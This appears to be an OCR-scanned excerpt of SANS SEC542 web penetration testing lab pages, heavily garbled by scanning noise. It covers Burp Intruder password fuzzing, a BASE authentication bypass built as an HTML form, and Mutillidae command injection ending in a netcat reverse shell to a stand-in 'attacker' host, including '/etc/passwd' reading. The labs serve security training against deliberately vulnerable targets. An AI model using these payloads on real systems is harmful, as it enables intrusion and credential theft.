SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
'-,,,/ 
'-' 
'-' 
'-' 
'-..../ 
'---"' 
'---' 
'-..../ 
'---"' 
'---"' 
'---' 
'---' 
'---"' 
'-..; 
'---' 
'-..../ 
'---' 
'---"' 
'-..../ 
'-..../ 
-.__,, 
'---"' 
'-' 
'--,- 
'---' 
,_,, 
'-.J 
\....., 
'-..../ 
'-..../ 
\...., 
'-..; 
'---"' 
'---' 
'---"' 
\...,. 
\...,. 
'-..; 
'--,- 
'---"' 
6 
'---' 
v 
.___,, 
Click Clear to clear the automatically determined fuzzing positions. We will manually add one position back 
on the next page. 
Repeater 
Sequencer 
Decoder 
Comparer 
Extender 
Options 
Alerts 
Target 
Proxy 
Spider 
scanner 
intruder 
Payloads 
Options 
Payload Positions 
[ start attack J 
r{:onfigure the positions where payloads will be inserted into the 
~ase request. The attack type determines the way in which 
payloads are assigned to payload positions - see help for full details. 
Attack type: .... [
. s_n_ip_e_r 
......,i;·l,.,,..,
'!) 
POST /form_auth/login. php HTTP/1.1 
Host: 
1,rw·v1.sec542.org 
User-Agent: Mozilla/5.0 (Xll; Linux i686; rv:50.0) 
Gecko/20100101 Firefox/50.0 
Accept: 
text/html,appl1cation/xhtml+xml,applicat1on/xml;q=0.9 
., */*; q=O. 8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Referer: 
http: //ol\oM. sec 542. org/form_auth/form_auth. html 
Connection: close 
Upgrade-Insecure-Requests: 
l 
Content- Type: app Li cat i on/x - ,l\oM- form- u r lencoded 
Content-Length: 33 
user=adent&pass=asdf&button=Login 
.... 
: Tvoe a search term 
o matches 
Add§ 
Clear§ 
Auto§ 
Refresh 
Clear 
o payload positions 
Length: 486 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
7 
Add the Password 
Highlight the password you typed previously: 
It will be "asdf" if you followed the directions closely. 
Simply double-clicking in the middle of "asdf" should highlight the entire password. 
Click Add to fuzz that field. It should now look like the following, with section symbols(§) around "asdf": 
Repeater 
Sequencer 
Decoder 
I 
Comparer 
I 
Extender 
Options 
Alerts 
Target 
Pro}()' 
Spider 
I 
Scanner 
Intruder 
Payloads I Options 
Payload 
Configure the positions where payloads will be inserted into the 
base request, The attack type determines the way in which 
payloads are assigned to payload positions - see help for full details, 
Attack type: ( Sniper 
[•] 
Host: ,,~,rw.sec542.org 
User-Agent: Mozilla/5.0 (Xll; Linux i686; rv:50.0) 
Gecko/20100101 Firefox/50.0 
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9 
, */*; q=O, 8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gz1p, deflate 
Referer: 
Start attack ] 
~l I 
Add§ 
J 
N [ 
Clear§ 
] 
http://Wl.rw.sec542. 
Connection: close 
Upgrade-Insecure- 
Content-Type: ap 
Content-Length: 
/form_auth/form_auth.html 
ion/x-W\!ti!/-form-urlencoded 
user=adent&pass~Jj'il"fi·&button=Login 
Auto§ 
Refresh 
!T 
! 
' 
i 
a searcn term 
L.---·-------·-- 
O matches 
Clear 
1 payload position 
length: 488 
Now, click the Payloads tab. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
'-" 
'---' 
'-" 
'----' 
'-' 
'--" 
'-' 
'-" 
'-' 
'-' 
'-' 
'-' 
'-' 
'-" 
'-' 
'-' 
'-' 
'-' 
'-' 
'-" 
'-' 
'-' 
·.__, 
'-' 
.'--" 
'-' 
'-' 
'-' 
'-" 
'-' 
'--' 
'-' 
'----' 
'----' 
'-' 
'-' 
'-' 
'-' 
'-' 
8 
'----' 
'-' 
'-._; 
Choose the Password List and Start the Attack 
Choose Simple List from the Payload Sets menu. Then click Load under Payload Options [Simple list]: 
Decoder 
Comparer 
Extender 
Spider 
Scanner 
Options 
[tJ Payload Sets 
You can define one or more payload sets, The number of payload 
sets depends on the attack type defined in the Positions tab. 
Various payload types are available for each payload set. and 
each payload type can be customized in different ways, 
Payload set: ~ 
Payload count: o 
Payload type: 
Request count: 0 
1~1 
[ Start attack j 
ltJ Pl!llyioad Options [Simple list] 
This payload type lets you configure a simple list of strings that are used as 
payloads, 
Remove 
Gleat 
11 
I 
i 
I 
I'.! 
C,1 
[T!' 
Select the file /opt/wordlists/splashdata-worst-passwords-2016. txt and click Open: 
Look !n: 
: !ii wordlists 
j [J splashdata-worst-passwords-2 o 14 .txt 
1 
splashdata-worst-passwords-2015 .txt 
US--census2000- astnames-top-100 .txt 
[J US-census2000-lastnames-top-1000,txt 
[J US-census2000-lastnames-top-151671.txt 
File !:'.:lame: 
· splashdata-worst-passwords-z o 16 .txt 
Files of Iype: 
1,,A 
__ 
II_F_He_s_· __ 
........,.. 
__.l__,!J 
Cancel I 
,__ 
, 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
9 
Click Start attack. 
Decoder 
I 
Comparer 
I 
Scanner 
Sets 
You can define one or more payload sets. The number of payload 
sets depends on the attack type defined in the Positions tab. 
Various payload types are available for each payload set and 
each payload type can be customized in different ways. 
Payload set: 
[ 1 
f•] 
Payload count: 25 
Payload type: 
Request count: 25 
--------·-·····-------- 
This payload type lets you configure a simple tist of strings that are used as 
payloads. 
123456 
password 
load ,<, l 
12345 
12345678 
Remove l football 
j qwerty 
Clear 
.-- 
!234557890 
, 
_:l.2.3.45.6 
Add 
Enter a 
I),, 
!,,, 
Click OK for the "The free edition of Burp ... " warning pop-up: 
The tree edition of Burp contains a demo version of Burp Intruder. Some functlona!ity is dlSabled, and attacks am time throttled. 
more detaas about Burp Suite Professional whrch contains the full version. 
Our input file is 25 lines long, which will work fine with Burp Free Edition. We will later use much larger 
inputs with ZAP's fuzzer, which is unrestricted. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
'---' 
'---' 
'---' 
'-..., 
'-..., 
'-" 
'-..., 
'-" 
'-" 
"---' 
'-" 
'-" 
'-" 
'--.../ 
'-" 
'-" 
'-..., 
'-..., 
'----' 
-.._/ 
'-..., 
"---' 
'--.../ 
'-" 
'--' 
'-" 
'-..., 
'-' 
'-...,/ 
'-" 
'-..., 
'-...,/ 
'-..., 
'-" 
'-" 
'-..,I 
'-..., 
'----' 
'-..., 
10 
'-" 
'-..,I 
'-" 
Burp Results 
All fuzzing attempts generated a 200 HTIP status code. 
This is quite common. 
~ 
Sort by length, largest to smallest, to see the successful request 
Attack Save Columns 
Results Target 
Positions 
Payloads 
Options 
Filter: Showing all items 
Request 
i Payload 
l Status 
19 
dragon 
200 
0 
200 
1 
123456 
200 
2 
password 
200 
3 
12345 
200 
4 
12345678 
200 
5 
football 
200 
6 
qwerty 
200 
7 
1234567890 
200 
8 
1234567 
200 
9 
princess 
200 
10 
1234 
200 
11 
login 
200 
12 
welcome 
200 
13 
solo 
200 
-······· 
u 
0 
0 
u 
0 
0 
0 
0 
0 
0 
0 
552 
552 
552 
552 
552 
552 
552 
552 
552 
552 
552 
~ 
Click on the "dragon" payload, and then click on the Response tab to see the HTML response. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
11 
____ .,.:,,;.,. _ _ .;;;r;,,,,,._ __ 
,,,.,~,~,;,,.,;s 
- + X 
Attack Save Columns 
Target I Positions I Payloads I Options 
.,___,, 
.,___,, 
[ Filter: Showing all items 
I Request 
jPay1oad ~ 
> 
.... 
. . 
I status 
! Error 
!Timeout :length 
"I Comment 
19 _. , = 
!dragon ..- 
IE&.(! W- !200 
O 
_ C _. 665 
0 
200 
0 
1 
123456 
200 
0 
2 
password 
3 
12345 
552 
0 
552 
0 
552 
0 
552 
'--' 
'--' 
'-' 
Request 
'--' 
'--' 
l--!TTP/1.1 200 OK 
Date: Sat, 20 Jan 2018 10:00:11 GMT 
Server: Apache/2.4.7 (Ubuntu) 
X·Powered·By: PHP/5.5.9·lubuntu4.20 
Vary: Accept·Encoding 
Content·Length: 453 
Connection: close 
Content·Type: text/html 
'-' 
'- 
'-" 
'-" 
<WOCTYPE htmi PUBLIC "-/ /W3C//DTD html 4. 61 t rsnei t ione 1//EN" 
11 http: _!/lif',,_,,1~'. ';,/3. org/TR! htmi4/ loose. dt d" > 
<html.> 
<head> 
.'-" 
'--' 
<title>Form Login</title> 
</head> 
<body> 
'-- 
__________ ..,.;;...,~..wi..i..._i=post action= login. php> 
<Hl Successful Form Authentication! /d><br>Enjoy an image from the Apollo 11 mission, courtesy of the Project Apollo Archive 
(ht p:,1www.apo 
care 1ve.com 
or simply Google "Project Apollo Archive")<br><br><img src="/images/Apollo-il.jpg"></body> 
</html> 
'-" 
' 
:,,. 
'-, ·' 
'-" 
r;:1 I Type" seil~Ch term 
.....•...................• ---------- 
O matches 
.___,, 
-....J 
Manually verify your results by going to Web Authentication - Forms in Firefox. 
'-" 
Log in with the following credentials: 
• 
Username: adent 
• 
Password: dragon 
'--' 
,._.,. 
--..,I 
'---' 
'-' 
'--' 
'-' 
'-" 
'-" 
'--' 
'-' 
.,___,, 
'-' 
'--' 
'-" 
'-' 
SEC542 -© 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
12 
\,J 
'-" 
'-' 
Final Step 
Be sure to disable the Burp proxy setting in Firefox so that it does not interfere with future labs. 
" 
Go to the Firefox Proxy Selector drop-down and choose No Proxy. 
SANS Se£urlty 542 - Web Pen Tustin 
542.1 
b Authentication - Di • est 
Heartbleed 
Ensure No Proxy is set when complete. 
No Pr 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
Rat Proxy 
13 
"' 
"' 
"' 
171 
,.--., 
,.--., 
------, 
"' 
,,......_ 
"' 
,--. 
,.--., 
" 
~ 
,......__ 
~ 
,......__ 
,.--., 
r's 
------, 
,......,_ 
r--, 
" 
~ 
,......__ 
r's 
~ 
r's 
,--. 
r's 
,.--., 
,.--., 
,.--., 
r's 
r's 
"' 
,........ 
" 
" 
,........ 
,........ 
,,...,_ 
" 
sa:,uaJaJau I 
· 
· 
Jixer:CisfJJJJ ±rfAt11gJfl}iiif1fiOiJ:~Y,naSS 
· 
· · · 
~ 
vl 
~=~ 
-=- ~ ;::; 7" 
'.'cc- ,,,.-:::::.__? X 
=: 
,cix;:: 
--z..---=-;;:__ 
- 
~:- - -X-v = ~ 
- "; ;'- 
~ 
- 
V 
" 
I Objectives 
• 
Perform an authentication bypass flaw in BASE 
• 
Appreciate authentication bypass is not necessarily equivalent to credentials 
• 
Identify a bypass flaw from code review and build a simple exploit 
jstep-by-Step Instructions 
Examine the Code in BASE 
The vulnerable portion of BASE is found in the base_ maintenance. php script in the following 
r--. 
location: /var/www/html/base/base_maintenance .php. This script allows the end user to 
perform some maintenance functions on the database tables that are used by BASE to store event 
information. Like most web-based applications, this script starts off trying to determine whether the user 
who is attempting to access the script is authorized to use its functionality. 
"' 
Open a terminal and view the vulnerable script: 
$ less /var/www/html/bj:ise/base_maintenance.php 
A relevant portion of the output follows: 
.. 
file 
Edit 
View 
Te 
$roleneeded = 18888; 
$8User = new BaseUser(); 
if ($Use Auth System = 1} 
{ 
- 
- 
if($ POST['standalone'] = "yes") 
{ 
- 
susrrote = $BUser->AuthenticateNoCookie($ POST[ 'user' I,$ POST[ 'pwd']); 
if ( (susrrote > srcteneedee) 11 ($usrrole- = "Failed"}) - 
{ 
die("Failed Authentication!"); 
} 
} 
etseif ( ($BUser->hasftole($roleneeded) = 0)) 
{ 
header("Location: ". $BASE_urlpath. "/index.php"); 
} 
} 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.1: Authentication Bypass 
1 
'-...I 
..___, 
Near the bottom of the code snippet, notice the code is attempting to see whether the user has a "role" or 
access level that is consistent with the role required to use the program. Again, this is standard fare for a 
web application. The problem with this script happens before the code gets to that point. 
At the outset of this code, the program looks to see whether it is being called by something that has set an 
HTIP POST variable called "standalone" to "yes". Because of the functionality that the 
base_maintenance.php script provides, it is sometimes desirable to call the script "locally" while 
monitoring the machine and the progress of the maintenance tasks. Because of this, there are two ways to 
call the base_maintenance.php script: Remotely, through a web browser, and locally, through another 
scripting mechanism provided by a Perl script called "base_maintenance.pl". 
When base_maintenance.pl calls its PHP namesake, it sets an HTIP POST variable called "standalone" to 
"yes". But a quick glance at the code here seems to indicate that even with "standalone" set to "yes", the 
script is still attempting to authenticate the user. There is a call to AuthenticateNoCookie() passing what 
appears to be credentials for checking. So where is the problem? 
'-...I 
'-...I 
'-../ 
'-...I 
'---' 
'--../ 
'--..,, 
'-.../ 
'-../ 
'-../ 
'-../ 
'--../ 
'-../ 
'--../ 
'-../ 
'--../ 
'--../ 
'-.../ 
'---' 
'-../ 
'-.../ 
'--../ 
'-.../ 
'-../ 
'-" 
'-.../ 
'-../ 
'-.../ 
'--../ 
'--../ 
'-...I 
'-...I 
'-...I 
'--../ 
'---' 
'-...I 
'-../ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.1: Authentication Bypass 
2 
'-...I 
'-../ 
"-' 
Create an HTML Exploit 
You could further view the flawed AuthenticateNoCookie() function with this command: 
$ less /y;1r/www/html/ ase/incl.ud.~~/base_aut:hrJnq .. php 
~ 
A relevant portion of the output follows: 
Term 
function AuthenticateNoCookie($user, $pwd) 
{ 
/*This function is solely used fer the stand alone modules! 
Accepts a username and a password 
returns a, 8 if the userneae and pwd are correct 
returns a 1 
the password is wrong 
returns a 2 
the user is disabled 
returns a 3 
the username doesn't exist 
*/ 
$cryptpwd = $this->cryptpassword($pwd}; 
The problem occurs because of a disconnect between what the author assumes AuthenticateNoCookie() 
does and what it actually does. According to this code snippet, AuthenticateNoCookie() returns one of 
several values: 0 = authentication succeeded, 1 = bad password, 2 = user disabled, and 3 = bad username. 
The function will also return "Failed" if something goes dramatically wrong. 
Following through the code, we find that the likely response, based on a user supplying no credentials 
beyond the "standalone=yes" POST variable is a return value of 3, caused by having a blank username. 
Looking back at the code from the previous page, we see that the return value from 
AuthenticateNoCookie() is compared to the "role" required, in this case, 10000. The full comparison is: 
" 
if { (3 > 10000) or if {AuthenticateNoCookie returned 
11Failure11)) 
Since the inner if statement fails, the entire code section shown on the previous slide is passed, and the 
code continues running. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.1: Authentication Bypass 
3 
'---" 
Build HTML Exploit 
'-...,I 
'-...,I 
The best way to test this theory based on code review is to send BASE an appropriate HTTP POST request 
and see whether it responds as we believe it will. The problem is finding an easy way to create the 
appropriate POST request. 
The easiest way to create a POST request is to write our own HTTP POST request using an HTML page with 
a form. 
Click the Application menu, on Accessories, and launch the Text Editor. We're going to create a form that 
will send a POST request with the right parameters to the server in order to attempt to bypass 
authentication. 
loit.html 
Type the following in gedit: 
<html><head></head><body> 
<form method=POST 
action=http://www.sec542.org/base/base_maintenance.php> 
=hidden 
Save this file as -/Desktop/base exploit. html 
The following screenshot shows the code as it should present in gedit: 
<html><head></head><body> 
<form method=POST action=http: //WWW. sec542. o rg/base/base __ maintenance. php» 
<input type=hidden name,,,,standalor,e value=yes> 
<in put t ype=s ubmi t></ f o rm></body></htm bl 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.1: Authentication Bypass 
\J 
'---' 
'-' 
'---' 
'---' 
'---' 
'-' 
'---" 
'---" 
'---" 
'-' 
'---' 
'---" 
'-' 
'-' 
'---" 
'---" 
'-' 
'-' 
'-' 
'---" 
'-' 
'-' 
'-' 
,_., 
'-' 
'-' 
'---" 
'-../ 
'---" 
'---" 
'---" 
'-' 
'---' 
'---,/ 
'---' 
'--' 
4 
'---' 
'-' 
'---' 
Testing Bypass Flaw 
Before launching the bypass flaw, determine what we should see if we call the page directly without using 
the exploit. 
,...., 
Type the following in a terminal: 
http://www.sec542.o;-g/base(~ase_maintenance.php 
Without exploitation, the expected behavior is to redirect us to the main page to allow for login: 
Basic Analysis ind Seaarity Ensine(IAS~} 1.2.2(1:indy}-Moolla Finifox 
--~---.- 
am Baslci Analysis and S... 
,c ~+ 
_ 
+ j (D WVIIW.sec542.org/base/index.php 
...... - 
...... 
El! Exe rel ses • f Mutltli doe 
DVWA 
Login:':------: 
P.ass.word: -- 
--- 
- 
----- j 
~ 
Now, let's see what happens when wielding our bypass exploit. 
Ensure that you saved the file in gedit. Then open the HTML page by double-clicking 
-/Desktop/base exploit. html or by running the following in a terminal: 
$ firefox -/Desktop/base_exploit.html 
When Firefox launches, click the Submit Query button to load 
/var /www/html/base/base _maintenance. php while bypassing any authentication 
requirement. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.1: Authentication Bypass 
5 
You should see the following page shown rather than a login page: 
,sk Analysis and 
X 
No 
• ft ti 
: 
!---------------------------~---- 
lll:OVWA 
·rcra~l-i'"iH?l£±: 
[Back) 
CLIENT: Mozilla/5.0 (X11; Ubuntu; Linux i686; 1¥.34.0) Gecl©J20100101 Arebx/34 Jl 
SERVER: Apacile/2.4.7 (Ubun!U) 
SERVER MW: Linux seturi!y542 3.13.0-43.generic #72-Ubun!U SMP Mon Dec 8 19:35:44 UTC 2014 1586 
PHP VERSION: 5·.5.9-lubunw,t5 
PHP API: apacile2handler 
PHP logging level: (22527) [E_ERROR} lE. 
.. 
. .. -- -OMPILE_WAR 
DB l'Jl)e: mysq l 
DB Abstraetioll version: V5.15 19 Jan 2012 (c) 2000·2-012 John Lim (jlim#na!SQltcom). AU rights reserved. Released BSD & LGPL. 
ALERT DB Name: snort 
. 
ARCHIVE DB Name: 
K~eJ>~it.Jaq1~~•··•.J 
If you still see a login prompt, double-check the syntax of -/Desktop/base_ exploit. html and try 
again. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.1: Authentication Bypass 
'--' 
'-' 
'-' 
..__,, 
.'-../ 
\...../ 
\...../ 
'-../ 
\...../ 
'--" 
'--" 
\...../ 
'-' 
'-' 
'-../ 
'-../ 
'--" 
'-' 
'-._./ 
'-../ 
'-..../ 
'-.../ 
'-..../ 
'-.J 
'-../ 
'-' 
\...../ 
\...../ 
'-../ 
'-' 
\...../ 
\...../ 
\...../ 
..__,, 
\...../ 
\...../ 
'-' 
'-../ 
\...../ 
'-' 
6 
'-' 
'-' 
'-..../ 
: 
~· B*~ise .. j.~i:... @e,~maRii'nj~on ... ·•• / · · .. ·•••·····• 
- -=- 
~ 
~ ~ 
= « 
~ ~ :::-- 
~- - 
- 
- 
~~ 
-- 
-~ 
- -=-- 
-=- 
-~~=:: 
"' 
!Objectives 
• 
Become familiar with command injection attacks 
• 
Use and inject netcat and PHP backdoors 
• 
Hands-on use and understanding of a reverse shell 
!Lab Note 
We have set up the/ etc/hosts file entry 'attacker.sec542.org', which points to 127.6.6.6. We did this 
to help keep the attacker and victim elements of this lab clearer. If you yearn to attack a 'real' remote 
system, you're in luck! 542.6 contains systems you will hack via a live network. 
The name 'attacker.sec542.org' points to 127.6.6.6 via the Security542 Linux VM /etc/hosts file. Most folks 
are more familiar with 127.0.0.1, which is one of 16,777,216 addresses that describe localhost. Try this to 
demonstrate: 
$ ping -c3 127.93.23.234 
Change the last octet to .235 and try again. 
In hindsight, assigning 16.7 million 1Pv4 addresses to describe localhost seems wasteful, but that ship has 
sailed. In the meantime, it gives us an easy way to create separate traffic via localhost. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.2: Command Injection 
1 
!Lab Setup 
V 
'-' 
Open Firefox and go to Exercises toolbar -> Mutillidae 
Go to OWASP 2017 -> Al - Injection (Other)-> Command Injection -> DNS Lookup 
V 
'-....- 
Note: If Mutillidae becomes slow or unresponsive, quit Firefox and restart. 
'---' 
'--" 
'--" 
'-' 
'-....- 
'-./ 
'---' 
'---' 
'-' 
'---' 
'-' 
'-../ 
I challenge: No Hints 
'-' 
'-../ 
Perform the following command injections via exploitation of Mutillidae's vulnerable DNS Lookup function: 
• 
Display /etc/passwd 
• 
Discover the privileges of the web server user 
• 
Ping attacker.sec542.org three times and display the packets with tcpdump 
• 
Send a shell to attacker.sec542.org 
Note: The entry attacker.sec542.org is set to 127.6.6.6 via the/ etc/hosts file. You may use that IP in 
your tcpdump filter. 
You may stop here and attempt these steps, or read ahead for step-by-step instructions. Students with 
command injection experience may want to attempt this exercise with no hints: It's your call. 
'-./ 
'---' 
'-./ 
'-....- 
'-../ 
'-../ 
'-./ 
'-' 
''-./ 
'-' 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
'-../ 
'-./ 
'-./ 
'-' 
'-' 
'-./ 
'-' 
'-../ 
'-../ 
'-../ 
'-./ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.2: Command Injection 
2 
'-,J 
'-" 
'-" 
lstep.:.by-Step Instructions 
We are hoping the programmer is not filtering characters in the "name" we choose to look up and has 
written the code as: 
$ nslookup <whatever they just typed> 
The exploit: Send a name, followed by a semicolon and a shell command: 
$ nslookup sec542.org; next command 
Let's try it; type this in the DNS Lookup form: 
sec542.org; cat /etc/passwd 
Who would you like to do a DNS. lookup on? 
Enter IP or hostname 
Hostname/lP 
(sec542.org; cat /etcJpasswd . 
Then click Lookup DNS. Note that the command is truncated in the screenshot above due to the size of the 
input box. 
One method for exploiting some command injection flaws is to append commands with"&&" or";". 
Double ampersand means: Run the second command if the first command exits without error. Semicolon 
means: Run the second command after the first command (regardless of any errors) 
We don't care about errors, so we use a semicolon. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.2: Command Injection 
3 
'-J 
Command Injection Results 
'-.J 
'-.J 
iologin 
/us,r /sbin/ 
/n:ologin 
: /UH' /sbin/nologin 
backup:x:34:J4::backup:/var/back11ps:/usr/sbin/D10login 
We have displayed the contents of/ etc/passwd. 
Why cat / etc/passwd? Both the cat command and the file/ etc/passwd are almost universally 
available across all major versions of UNIX and Linux, and/ etc/passwd is normally world readable. 
The actual hashes are most likely in/ etc/ shadow, which we would normally not be able to read via the 
web server user. 
You may try to view other files as well. Unfortunately, we lack the permission to view/ etc/ shadow. The 
next step illustrates why. 
\,_,I 
'-.J 
'-.J 
'-J 
'---' 
'-J 
·.._; 
'-J 
'-.J 
'-J 
'-J 
'-J 
'-J 
'-...,- 
'---' 
'-.J 
'-J 
'---' 
'-../ 
'-J 
'-J 
'----' 
'-./ 
'---' 
'-./ 
'-J 
'-J 
'--' 
'-J 
'-J 
'-../ 
'-../ 
'-../ 
'----' 
'----' 
'-J 
'----' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.2: Command Injection 
4 
'----' 
'---' 
Discover the Privileges of the Running User 
Go back to the DNS Lookup form and type: 
The web server is running as uid 33, user www-data. This is normal: Web servers typically run as lower- 
privileged users to limit the damage from attacks such as the ones we are launching right now. 
The id command is quite handy for command injection attacks. It shows us the privileges (uid, gid, and 
group membership) of the current user. It is also small (two characters) and generally available across all 
versions of UNIX, Linux, and Mac OSX. It is also usually in a default path, normally /usr/bin/id. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.2: Command Injection 
5 
Ping attacker .sec542.org 
This command injection is not blind. We can see the results of our commands. It is quite useful to develop 
command injection techniques that work blind, as ping does. 
Type this command in a terminal as one continuous line (if prompted, the password is "Security542"): 
This tells sudo (see notes below) to run tcpdump as root, not resolve names (-n), listen on all interfaces (-i 
any), and capture traffic sent to/from attacker.sec542.org and capture/display only icmp echo requests 
(icmp[icmptype]=icmp-echo). The simpler BPF filter icmp would also work but may capture additional 
unrelated icmp traffic. 
Note: "sudo" is "su do", or "super user do", a way to run commands requiring root access as a normal 
user. The user must have proper permission beforehand, one way is to add the account to the "sudo" 
group (as we have done for the student account). It will require a password the first time it is run in a 
terminal and will remember that password in that terminal for 5 minutes (by default). 
Not having yet seen traffic that matches the pattern, the initial result of running tcpdump command looks 
like the following: 
[-]$ sudo tcpdump -ni any host attacker.sec542.org and icmp[icmptype]=icmp-echo 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode 
listening on any, link-type LINUX_Sll (Linux cooked), capture size 65535 bytes 
Then, enter the following in the DNS Lookup: 
Then click Lookup DNS. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.2: Command Injection 
'-" 
'--' 
\.../ 
'-...,I 
'-...,I 
'-....,I 
'-....,I 
'-- 
'-....,I 
'-....,I 
'-...,I 
'-...,I 
'-...,I 
'-....,I 
'-' 
'-' 
'-' 
'-' 
'-' 
'-" 
'-....,I 
'-../ 
'-....,I 
'-../ 
'-...,I 
'-../ 
''-....,I 
''-....,I 
'-.._/ 
'-" 
'-" 
'-' 
''-....,I 
'-' 
'-../ 
'-' 
'-../ 
'-....,I 
'-../ 
'-" 
6 
'-....,I 
'-" 
'-....,I 
Ping Resu Its 
Results f~r sec542.org; ping -c3 attacker.sec542.org 
127.9.8.1 
127,8.8.l#S3 
sec:542.org 
t 192.168.1.8 
PDG attaeker.sec:542.org (127.6,6.6) 56(84) bytes of data. 
64 bytes from attadc:er~sec:542.org (127.6.6.6)1 
tt'b:64 t:mr-1.815 ms 
64 bytes fra attacfuar.s'e(:542.org (117.6.&.6): 
tt'b:64 t:mr-1.843 ms 
64 bytes fra atta-cker.sec:542.org {127.6.i.6): :leap_ eq=3 ttl.=64 time=t.845 111s 
..... lilttKker.sec:542.org ping ,statistics .... 
3 packets tranwtted, 3 rec:-eived, .., packet 1.oss. time 2e&llo 
rit ,dn/avg/mx/mdev = 9.&15/8.834/9.845/9.81-4 • 
The previous web page again shows this command injection not to be blind. However, the following 
screenshot shows that even if it were we could have been made aware of the successful inject: 
.., 
)'te..:_f;dl' Y!m: TinniMJ _Tabs 
Help 
_ 
[-JS sudo tcpdump -ni any host attacker.sec542. 
tcpdu11p: verbose output suppressed, use -v or -vv 
full protocol decode 
listening on any, link-type LINUX_SLL (Linux cooked), capture size 65535 bytes 
08:24:22.401231 IP 127.0.8.l > 127.6.6.6: ICMP echo request, id 18158, seq 1, length 64 
88:24:23.488249 IP 127.8.8.1 > 127.6.6.6: ICMP echo request, id 18158, seq 2, length 64 
08:24:24.399324 IP 127.0.0.1 > 127.6.6.6: ICMP echo request, id 18158, seq 3, length 64 
~ 
Right now, we are pinging ourselves to prove the concept and understand the process. 
Press Ctrl-C in the terminal window to stop tcpdump. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.2: Command Injection 
7 
Open a Reverse Shell 
...__, 
Let's open a reverse shell via command injection. This is sometimes called 'shoveling' a shell and means we 
will send the shell to a waiting listener rather than opening a listening backdoor on the victim. We're using 
the name 'attacker.sec542.org' to signify the attacker receives the shell. In this example, the TCP 
connection carrying the shell will initiate from the web server (the web server will send the initial SYN 
packet to attacker.sec542.org:1337), and flow outbound to the attacker: 
[web server] 
----> [attacker.sec542.org] 
If there is a firewall, the TCP connection to attacker.sec542.org:1337 will be outbound, not inbound, and is 
much more likely to be allowed. Type the following in a terminal window: 
I $ >!le •.. -lvvnp 1337 
. l 
Note that the first flag is the lowercase letter I ("ell"}, not the number one. This tells netcat to listen (I) on 
(p) port 1337. The (w) tells netcat to be verbose in its communication. The (n) indicates that no name 
resolution should be performed. 
The attack system is now awaiting connections on port 1337: 
,., 
Tt!rminal 
- + 
X 
="'"--·-
:··. 
1 [ -1 $ nc ~ Lvvnp 1337 
,listening on [any] 1337 
I 
Then type the following in the DNS Lookup form: 
sec542.org; nc attacker.sec542.org 1337 -e /bin/bash 
Click Lookup DNS. 
Note: The web page will seem unresponsive and not immediately return any results. This is expected as 
the web server is currently connected to the attacker via a reverse shell. 
Go back to the terminal window, and you should see a new connection shows up. Now you can type shell 
commands. There will not be a banner to indicate the shell. Thankfully, the (vv) switch will report any 
connections, so even though we haven't received data we know the connection is waiting for us to just 
start typing commands. 
,...__, 
'-' 
'-' 
'-J 
'-../ 
'-' 
'-----' 
'--- 
'-----' 
'-----' 
'-----' 
'-----' 
'-'' 
'-----' 
'-----' 
'-----' 
'-----' 
'-----' 
'-----' 
'--._., 
\..,, 
'------' 
'------' 
'-._./ 
'-----' 
'------' 
'-----' 
...__, 
'--._., 
'-----' 
'-----' 
'-----' 
'-----' 
'-._./ 
'-----' 
'-----' 
'------' 
'-----' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.2: Command Injection 
8 
'------' 
'-J 
'-._./ 
i [ -] $ nc - l vvnp 1337 
ltistening on (any] 1337 
!connect to [127.6.6.6] from (UNKNOWN) [127.0.0.l] 52826 
11 
+ 
X 
,...._ 
Try some simple Linux commands such id or uname: 
,...._ 
uname -a 
This is a simple way to attempt to determine the kernel version of a Linux system. Having realized, via the 
id command, that we are running under what are almost definitely lower level privileges, an older kernel 
version could indicate possible local privilege escalation vectors: 
Flt!: 
Edit View Terinrnat 
(-1$ nc -lvvnp 1337 
listening on (any] 1337 ... 
connect to [127.6.6.6] from (UNKNOWN) (127.8.8.l] 52836 
uname -a 
Linux Security542 3.13.8-188-generic #155-Ubuntu SMP Wed Jan 11 16:57:96 UTC 20 
7 1686 1686 1686 GNU/Linux 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.2: Command Injection 
9 
Our Shell 
Success! 
'-' 
'-" 
"' 
Tetminal 
""'• + 
X 
Tabs 
[-1$ nc -lvvnp 
listening on (any] 1337 
connect to [127.6.5.6] from (UNKNOWN) (127.8.8.11 47688 
id 
uid=33(www-data} gid=33(www-data} groups=33(www-data) 
uname -a 
Linux Security542 3.13.8-188-generic #155-Ubuntu SMP Wed Jan 11 16:57:86 UTC 201 
7 1686 1686 1686 GNU/Linux 
'-" 
'-' 
'--' 
,._,. 
'-../ 
'--' 
